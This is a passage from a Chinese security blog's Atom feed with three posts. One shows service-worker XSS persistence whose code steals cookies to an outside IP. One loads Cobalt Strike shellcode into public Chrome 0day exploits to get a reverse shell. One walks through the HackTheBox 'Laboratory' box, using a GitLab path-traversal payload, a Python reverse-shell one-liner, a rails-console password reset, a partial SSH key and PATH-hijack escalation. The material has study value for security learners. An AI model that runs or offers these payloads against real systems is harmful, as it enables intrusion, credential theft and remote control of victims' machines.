&#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125;        )    )&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回一个html的内容。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>由于service worker存在的一定的限制，需要绕过同源，所以这里最方便的就是使用jsonp。因此需要一个jsonp的接口，并且这个接口的参数可操纵。</p><p>所以在注册的时候，需要一个jsonp的调用，例如</p><pre class="line-numbers language-none"><code class="language-none">navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;alert(1)&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合上面的响应，<code>importScripts</code>导入远程js文件。</p><pre class="line-numbers language-none"><code class="language-none">navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;importScripts(&quot;https:&#x2F;&#x2F;xx&#x2F;test.js&quot;)&#39;);​&#x2F;&#x2F;test.jsself.addEventListener(&#39;fetch&#39;, function(event) &#123;    event.respondWith(        new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;,            &#123;headers: &#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125;        )    )&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地调试一下，先本地导入这个js文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140129968.png" alt="image-20210607140129968"></p><p>在刷新一下页面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140401009.png" alt="image-20210607140401009"></p><p>在谷歌浏览器下，执行<code>chrome://serviceworker-internals</code>查看已经注册的service worker。能看到一个正在运行的service worker。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140448999.png" alt="image-20210607140448999"></p><p>同样，在没有jsonp可以利用的地方，就需要查找是否有可利用的上传点，上传一个js脚本上去。直接在同源下利用即可。</p><p>如果需要无感反馈，但是service worker并不能操作document，Window对象。如下是模拟一个请求，每次触发响应的时候都会跨域发送一个请求到指定地址，但并不能携带敏感信息。</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function(event) &#123;  console.log(&#39;Handling fetch event for&#39;, event.request.url);​  event.respondWith(    caches.match(event.request).then(function(response) &#123;      const url&#x3D;&#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;;      const othePram&#x3D;&#123;          headers:&#123;              &quot;content-type&quot;:&quot;text&#x2F;plain&quot;          &#125;,          method:&quot;GET&quot;,          mode: &#39;cors&#39;,          credentials:&#39;include&#39;      &#125;;      fetch(url, othePram)      .then(res&#x3D;&gt;console.log(res))      console.log(&#39;No response found in cache. About to fetch from network...&#39;);​      return fetch(event.request).then(function(response) &#123;        console.log(&#39;Response from network is:&#39;, response);        return response;      &#125;);    &#125;)  );&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607162103258.png" alt="image-20210607162103258"></p><p>这里采用监听返回的url为特定地址的话返回修改的response。比如使用如下代码</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function (event) &#123;        event.respondWith(        caches.match(event.request).then(function(response)&#123;            console.log(fetch(event.request));            var url &#x3D; event.request.clone();            if (url.url&#x3D;&#x3D;&#39;http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;dvwa&#x2F;js&#x2F;dvwaPage.js&#39;)&#123;                                return new Response(&quot;var httpRequest &#x3D; new XMLHttpRequest();httpRequest.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;+document.cookie, true);httpRequest.send();&quot;)            &#125;else&#123;                return fetch(event.request).then(function(response) &#123;                console.log(&#39;Response from network is:&#39;, response.url);​                return response;              &#125;, function(error) &#123;                console.error(&#39;Fetching failed:&#39;, error);​                throw error;              &#125;);            &#125;        &#125;)        )   &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>监听是否是指定的地址，此处使用一个脚本文件，在脚本中返回一个请求来触发。但只是这样的话会破坏一个js的使用，所以可以返回原js文件的同时，再添加一个恶意的js代码到其中。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607173505261.png" alt="image-20210607173505261"></p><p>参考文章</p><p><a href="https://paper.seebug.org/177/">https://paper.seebug.org/177/</a></p><p><a href="https://xz.aliyun.com/t/8679">https://xz.aliyun.com/t/8679</a></p><p><a href="http://zerobs.top/2020/11/15/71.html">http://zerobs.top/2020/11/15/71.html</a></p><p><a href="https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss">https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;service-worker&quot;&gt;&lt;a href=&quot;#service-worker&quot; class=&quot;headerlink&quot; title=&quot;service worker&quot;&gt;&lt;/a&gt;service worker&lt;/h2&gt;&lt;p&gt;service worker是一种特殊的we
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike上线Chrome 0day</title>
    <link href="https://misakikata.github.io/2021/04/CobaltStrike%E4%B8%8A%E7%BA%BFChrome-0day/"/>
    <id>https://misakikata.github.io/2021/04/CobaltStrike上线Chrome-0day/</id>
    <published>2021-04-15T08:44:43.000Z</published>
    <updated>2021-04-15T08:44:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141913647.png" alt="image-20210415141913647"></p><p>先运行第一个poc，<a href="https://github.com/r4j0x00/exploits">https://github.com/r4j0x00/exploits</a>，此处是开启了一个本地环境。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141840516.png" alt="image-20210415141840516"></p><p>再试一下另一个新的，chrome的修复版本90也存在影响。<a href="https://github.com/avboy1337/1195777-chrome0day">https://github.com/avboy1337/1195777-chrome0day</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415151034661.png" alt="image-20210415151034661"></p><p>此版本的POC其中的shellcode格式很眼熟，尝试利用cobaltstrike生成C#的payload。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415145847136.png" alt="image-20210415145847136"></p><p>生成后提取其中的十六进制的shellcode字段。类似如下。</p><pre class="line-numbers language-none"><code class="language-none">0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, ......0xf9, 0x1f, 0x00, 0xc6, 0xf5, 0x3b, 0xd3, 0x99, 0x7b, 0x9a, 0xf4, 0xba, 0x71, 0x45, 0x52, 0x29, 0x67, 0xeb, 0x53, 0x59, 0xc5, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x31, 0x31, 0x2e, 0x31, 0x33, 0x30, 0x00, 0x12, 0x34, 0x56, 0x78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>替换原exploit的shellcode字段。类似如下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150014088.png" alt="image-20210415150014088"></p><p>谷歌执行，会一直在加载的未响应状态，查看cs的能看到一个chrome进程的反弹shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150140652.png" alt="image-20210415150140652"></p><p>但由于正常使用默认设置是沙盒环境，此漏洞并不影响，所以这个还得需要配合沙盒逃逸才有效果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Laboratory</title>
    <link href="https://misakikata.github.io/2021/04/Laboratory/"/>
    <id>https://misakikata.github.io/2021/04/Laboratory/</id>
    <published>2021-04-02T09:30:53.000Z</published>
    <updated>2021-04-02T09:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>国际惯例，先执行nmap扫描</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401124339754.png" alt="image-20210401124339754"></p><p>看到跳转到laboratory.htb，配置host文件，指向10.10.10.216，访问查看是个啥。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401114204630.png" alt="image-20210401114204630"></p><p>按照国际惯例第二步，查看目录。使用dirb来爆破目录，此处尝试了半天没有发现任何有用信息，只是发现可以目录浏览，<a href="https://laboratory.htb/assets/">https://laboratory.htb/assets/</a>，当然下面也没有任何有用信息，都是一些css文件和图片。</p><p>目前来看没有下一步的方法，肯定是有啥没被发现。再去扫一遍端口，想看看是不是遗漏了啥，但是发现结果仍然一样，不过注意到了其中的一个DNS名称：git.laboratory.htb。</p><p>同样配置后访问发现是一个gitlab服务，需要注册一个账号。注册完成后登陆即可，然后发现一个公开的库，是刚才那个网站的前端代码，跟上面浏览的一致，也没啥</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125022916.png" alt="image-20210401125022916"></p><p>发现一个issus，提交是说服务有问题，那这个418是啥。状态代码418被定义为愚人节的笑话，并且“预计不会被实际的HTTP服务器实现”。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125355719.png" alt="image-20210401125355719"></p><p>这就是个愚人节玩笑，难道这个有用？查了一下发现触发类似某种特定情况下，比如未知的错误会被定向到418，但是这个系统好像没有这一说。</p><p>搜一下gayhub，查到一个CVE-2020-10977，文件读取漏洞，尝试执行读取passwd查看。后续并没有找到可以帮助获取权限的敏感文件，返回基本都是400。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401140849690.png" alt="image-20210401140849690"></p><p>正好根据这个靶场看一下这个漏洞怎么执行。需要先创建两个项目，如test1，test2。</p><p>在一个项目下创建一个issus，写入如下内容</p><pre class="line-numbers language-none"><code class="language-none">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402132824827-1617345369811.png" alt="image-20210402132824827"></p><p>然后再移动这个issus到另一个项目下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133032215-1617345372559.png" alt="image-20210402133032215"></p><p>然后在test2下就可以看到一个可以下载的passwd文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133117660-1617345374422.png" alt="image-20210402133117660"></p><p>后续的RCE就是读取了<code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>中的密钥</p><p>获取其中的<code>secret_key_base</code>：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133905331-1617345376422.png" alt="image-20210402133905331"></p><p>在gayhub上又找一个RCE可以使用，利用的也是上面的文件读取来获取key，然后在构造一个payload来执行rails控制台。需要先修改一些参数。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143832510.png" alt="image-20210401143832510"></p><p>需要监听端口，执行后监听端口反弹shell。不过这个shell及其不稳定，需要获取一个较为稳定的shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143900205.png" alt="image-20210401143900205"></p><p>新建一个文件写入python的反弹shell代码，如下</p><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启一个http服务，然后运行下载此文件，系统上存在的python命令是python3。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151620979.png" alt="image-20210401151620979"></p><p>监听1234端口后，就能收到一个较为稳定的shell，在使用pty来升级一下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151716618.png" alt="image-20210401151716618"></p><p>当前的git用户权限并不高，也没有sudo权限。上传linpeas.sh文件，来查看一下是否有能提权的方法。</p><p>当前的可登陆用户就这几个，可能是直接获取root权限，不然就是获取别的用户权限再去获取root权限。查看一下其他用户是否能切换等。</p><pre class="line-numbers language-none"><code class="language-none">git:x:998:998::&#x2F;var&#x2F;opt&#x2F;gitlab:&#x2F;bin&#x2F;shgitlab-consul:x:991:991::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;consul:&#x2F;bin&#x2F;shgitlab-prometheus:x:992:992::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;prometheus:&#x2F;bin&#x2F;shgitlab-psql:x:996:996::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;postgresql:&#x2F;bin&#x2F;shmattermost:x:994:994::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;mattermost:&#x2F;bin&#x2F;shregistry:x:993:993::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;registry:&#x2F;bin&#x2F;shroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这几个用户并没有自己的用户目录，也不能进行查询切换等，基本是无用信息。内核为5.4版本，是多担心利用内核漏洞提权。尝试了一圈没发现能顺利提权的东西，那这个shell是给来做啥的。。。</p><p>仔细看一下发现是个docker环境，可能是docker部署的gitlab，然后我们要拿到的应该是主机的权限。</p><p>搜了一下有关的信息，看到一个rails命令，也跟shell的初始目录一致。这是一个命令行与GitLab实例进行交互的方法。Rails Runner还可以运行ruby代码。回头看一下漏洞执行代码，发现好像也是利用了这个性质来执行的ruby代码。还可以修改用户信息等，那么可以尝试一下是否能修改原来库的创建者的密码，也就是dexter 。执行的时候一直在报错，提示不正确。查一下错，发现是参数使用不正确。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163139147.png" alt="image-20210401163139147"></p><p>使用如下执行修改密码为test123456</p><pre class="line-numbers language-none"><code class="language-none">git@git:~&#x2F;gitlab-rails&#x2F;working$ gitlab-rails console -e productiongitlab-rails console -e production-------------------------------------------------------------------------------- GitLab:       12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL:   10.12--------------------------------------------------------------------------------Loading production environment (Rails 6.0.2)irb(main):001:0&gt; user &#x3D; User.where(username:&quot;dexter&quot;).firstuser &#x3D; User.where(username:&quot;dexter&quot;).firstuser &#x3D; User.where(username:&quot;dexter&quot;).first&#x3D;&gt; #&lt;User id:1 @dexter&gt;irb(main):002:0&gt; user.password &#x3D; &quot;test123456&quot;user.password &#x3D; &quot;test123456&quot;user.password &#x3D; &quot;test123456&quot;&#x3D;&gt; &quot;test123456&quot;irb(main):003:0&gt; user.save!user.save!user.save!Enqueued ActionMailer::DeliveryJob (Job ID: 1c4bf31e-e3f6-4056-9685-45f6a4c7d2e2) to Sidekiq(mailers) with arguments: &quot;DeviseMailer&quot;, &quot;password_change&quot;, &quot;deliver_now&quot;, #&lt;GlobalID:0x00007ff5fd3ef940 @uri&#x3D;#&lt;URI::GID gid:&#x2F;&#x2F;gitlab&#x2F;User&#x2F;1&gt;&gt;&#x3D;&gt; trueirb(main):004:0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登陆后发现还有一个SecureDocker库。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163609462.png" alt="image-20210401163609462"></p><p>在目录下找到一个dexter&#x2F;.ssh目录，里面存在ssh的私钥信息。那就直接登陆查看。试了一圈发现不能登陆，一直提示格式不对，查了一圈发现这个id_rsa是新的openssh生成的新格式私钥。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112405208.png" alt="image-20210402112405208"></p><p>内容是<code>OPENSSH PRIVATE</code>开头的，服务器上需要的可能不是新格式，所以我们需要转换为<code>RSA PRIVATE</code>格式。</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt.......XCVyJn9QMEbE4fdpKGVF+MS&#x2F;CkfE+JaNH9KOLvMrlw0bx3At681vxUS&#x2F;VeISQyoQGLw&#x2F;fuuJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载<a href="https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe">https://the.earth.li/~sgtatham&#x2F;putty&#x2F;latest&#x2F;x86&#x2F;puttygen.exe</a>，然后打开File–&gt;load private key，加载后点击conversions–&gt;export openssh key第一项导出即可。格式如下。</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIG4wIBAAKCAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNU......5iqrf2njCLyuQRo1W4kpgWjwVMdZVwqzdn&#x2F;LQ1UaE95ppDDdwAeNS&#x2F;&#x2F;8rR24oD+b+FbxNZUCzUgDmQ0PiwOs07JtFaE+HMuickqFx5W96gOye6dLD+8u-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用登陆查看，别忘记切换600的权限。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112848551.png" alt="image-20210402112848551"></p><p>获取第一个用户的flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112936133.png" alt="image-20210402112936133"></p><p>按照惯例，先查看SUID位，发现存在一个不和谐的文件<code>/usr/local/bin/docker-security</code>。是一个二进制文件，执行没有反应。利用ltrace来查看一个调用跟踪。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402114714292.png" alt="image-20210402114714292"></p><p>大概就是一个限制docker权限的文件，先设置uid和gid位，后续执行chmod来调整权限。相当于用root的权限来限制。没有设置全路径，所以可以修改文件的执行目录，让先从我们设定的目录开始查找命令执行。利用环境变量来提权，参考：<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a>。现在&#x2F;tmp下新建一个反弹shell，名为chmod。赋予执行权限。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402124831047.png" alt="image-20210402124831047"></p><p>监听端口后可以获取一个root的shell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;国际惯例，先执行nmap扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401124339754.png&quot; alt=&quot;image-202104
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
